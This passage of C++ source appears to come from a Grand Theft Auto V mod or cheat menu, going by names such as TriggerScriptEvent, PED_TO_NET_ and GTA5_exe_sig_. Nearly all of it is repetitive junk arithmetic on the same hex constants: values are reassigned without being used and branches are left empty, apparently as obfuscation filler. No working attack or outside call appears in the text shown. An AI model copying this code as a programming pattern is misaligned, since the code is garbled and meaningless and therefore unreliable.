			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("</ReferenceCoords>");
		}
		void AddSpawnToXML_Prop(GTA::Spawn_Struct Estrutura)
		{
			Extern_Reader::LOG::arquivoTXT = XMLPath;

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
